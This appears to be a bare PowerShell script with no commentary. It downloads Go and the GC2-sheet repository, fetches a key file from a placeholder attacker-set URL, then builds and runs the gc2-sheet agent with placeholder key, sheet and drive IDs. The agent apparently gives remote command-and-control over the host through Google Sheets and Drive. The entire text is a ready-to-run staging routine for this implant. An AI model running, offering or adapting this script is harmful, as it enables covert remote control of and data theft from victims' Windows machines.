cd $env:userprofile\Downloads;
iwr https://go.dev/dl/go1.21.12.windows-amd64.zip -o go.zip;
expand-archive go.zip;
mv .\go $env:userprofile;rm -r -force .\go.zip;
$env:PATH += ";$env:userprofile\go\go\bin";
iwr https://github.com/looCiprian/GC2-sheet/archive/refs/heads/master.zip -o master.zip;
expand-archive .\master.zip;
rm -r -force master.zip;
cd .\master\GC2-sheet-master;
iwr http://#MY_TARGET_URL/my_key.json -o my_key.json;
go build gc2-sheet.go;
.\gc2-sheet -k #MY_KEY_JSON -s #MY_SHEET_ID -d #MY_DRIVE_ID
